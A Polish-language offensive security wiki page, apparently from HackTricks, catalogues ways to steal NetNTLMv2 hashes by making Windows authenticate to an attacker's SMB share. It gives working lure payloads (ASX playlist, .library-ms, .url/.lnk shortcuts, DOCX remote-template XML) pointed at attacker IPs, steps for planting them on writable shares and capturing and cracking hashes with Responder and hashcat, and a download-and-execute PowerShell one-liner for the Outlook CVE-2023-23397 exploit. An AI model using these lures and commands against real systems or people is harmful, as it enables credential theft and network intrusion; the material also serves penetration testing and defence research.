# Miejsca do kradzieży NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Sprawdź wszystkie świetne pomysły z [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — od pobrania pliku Microsoft Word online po źródło ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md oraz [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Zapisalny udział SMB + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Jeśli możesz **zapisać na udziale, który użytkownicy lub zaplanowane zadania przeglądają w Explorer**, upuść pliki, których metadane wskazują na twój UNC (np. `\\ATTACKER\share`). Renderowanie folderu wyzwala **implicit SMB authentication** i powoduje wyciek **NetNTLMv2** do twojego listenera.

1. **Wygeneruj lures** (obejmuje SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Upuść je na zapisywalny udział** (dowolny folder, który ofiara otworzy):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Nasłuch i crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows może odczytać kilka plików jednocześnie; wszystko, co Explorer podgląda (`BROWSE TO FOLDER`), nie wymaga kliknięć.

### Playlisty Windows Media Player (.ASX/.WAX)

Jeśli uda ci się sprawić, aby cel otworzył lub podglądał playlistę Windows Media Player, którą kontrolujesz, możesz spowodować leak Net‑NTLMv2, wskazując wpis na ścieżkę UNC. WMP spróbuje pobrać wskazane multimedia przez SMB i uwierzytelni się automatycznie.

Przykładowy payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Przepływ zbierania i łamania:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### Osadzony w ZIP .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer nieprawidłowo obsługuje pliki .library-ms, gdy są otwierane bezpośrednio z archiwum ZIP. Jeśli definicja biblioteki wskazuje na zdalną ścieżkę UNC (np. \\attacker\share), samo przeglądanie/uruchamianie .library-ms wewnątrz ZIP powoduje, że Explorer enumeruje UNC i wysyła uwierzytelnianie NTLM do atakującego. To daje NetNTLMv2, które można złamać offline lub potencjalnie relayed.

Minimalny plik .library-ms wskazujący na UNC atakującego
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Kroki operacyjne
- Utwórz plik .library-ms z powyższym XML (ustaw swój adres IP/nazwę hosta).
- Spakuj go do ZIP (w Windows: Send to → Compressed (zipped) folder) i dostarcz archiwum ZIP do celu.
- Uruchom NTLM capture listener i poczekaj, aż ofiara otworzy plik .library-ms z wnętrza ZIP.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows przetwarzał rozszerzoną właściwość MAPI PidLidReminderFileParameter w elementach kalendarza. Jeśli ta właściwość wskazywała na UNC path (np. \\attacker\share\alert.wav), Outlook kontaktował się z udziałem SMB, gdy przypomnienie było wywołane, powodując leak Net‑NTLMv2 użytkownika bez żadnego kliknięcia. Zostało to załatane 14 marca 2023, ale wciąż ma duże znaczenie dla przestarzałych/niezmienionych środowisk i dla historycznej analizy incydentów.

Szybkie wyeksploatowanie za pomocą PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Strona Listenera:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Uwagi
- Ofiara musi mieć uruchomiony Outlook for Windows tylko w momencie wywołania przypomnienia.
- Ten leak ujawnia Net‑NTLMv2 odpowiedni do offline cracking lub relay (nie pass‑the‑hash).


### .LNK/.URL oparty na ikonach zero‑click NTLM leak (CVE‑2025‑50154 – obejście CVE‑2025‑24054)

Windows Explorer automatycznie renderuje ikony skrótów. Najnowsze badania wykazały, że nawet po kwietniowej poprawce Microsoftu z 2025 roku dla UNC‑icon shortcuts nadal było możliwe wywołanie uwierzytelnienia NTLM bez kliknięć przez umieszczenie celu skrótu na ścieżce UNC i pozostawienie ikony lokalnie (obejście poprawki otrzymało CVE‑2025‑50154). Samo przeglądanie folderu powoduje, że Explorer pobiera metadane z zdalnego celu, wysyłając NTLM do atakującego serwera SMB.

Minimalny Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Skrót programu payload (.lnk) za pomocą PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Umieść skrót w ZIP i spraw, by ofiara go przeglądała.
- Umieść skrót na zapisywalnym udziale, który ofiara otworzy.
- Połącz z innymi plikami przynętowymi w tym samym folderze, aby Explorer podglądał elementy.

### Wyciek NTLM z .LNK bez kliknięcia przez ścieżkę ikony w ExtraData (CVE‑2026‑25185)

Windows wczytuje `.lnk` metadata podczas **wyświetlania/podglądu** (renderowania ikony), nie tylko przy uruchomieniu. CVE‑2026‑25185 pokazuje ścieżkę parsowania, w której bloki **ExtraData** powodują, że shell rozwiązuje ścieżkę ikony i dotyka systemu plików **podczas ładowania**, wysyłając połączenie NTLM, gdy ścieżka jest zdalna.

Key trigger conditions (observed in `CShellLink::_LoadFromStream`):
- Dodaj **DARWIN_PROPS** (`0xa0000006`) w ExtraData (bramka do rutyny aktualizacji ikony).
- Dodaj **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) z wypełnionym **TargetUnicode**.
- Loader rozwija zmienne środowiskowe w `TargetUnicode` i wywołuje `PathFileExistsW` na powstałej ścieżce.

Jeżeli `TargetUnicode` rozwiąże się do ścieżki UNC (np. `\\attacker\share\icon.ico`), **zwykłe przeglądanie folderu** zawierającego skrót powoduje uwierzytelnianie wychodzące. Ta sama ścieżka ładowania może być też wywołana przez **indeksowanie** i **skanowanie AV**, co czyni ją praktyczną powierzchnią wycieku bez klikania.

Narzędzia badawcze (parser/generator/UI) są dostępne w projekcie **LnkMeMaybe** do budowania i sprawdzania tych struktur bez użycia GUI Windows.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Dokumenty Office mogą odwoływać się do zewnętrznego szablonu. Jeśli ustawisz powiązany szablon na ścieżkę UNC, otwarcie dokumentu spowoduje uwierzytelnienie do SMB.

Minimal DOCX relationship changes (inside word/):

1) Edytuj word/settings.xml i dodaj odwołanie do załączonego szablonu:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Edytuj word/_rels/settings.xml.rels i ustaw rId1337 na swój UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Spakuj ponownie do .docx i dostarcz. Uruchom swój SMB capture listener i poczekaj na otwarcie.

Po przechwyceniu — pomysły na relaying lub abusing NTLM znajdziesz w:

{{#ref}}
README.md
{{#endref}}


## Źródła
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)


{{#include ../../banners/hacktricks-training.md}}
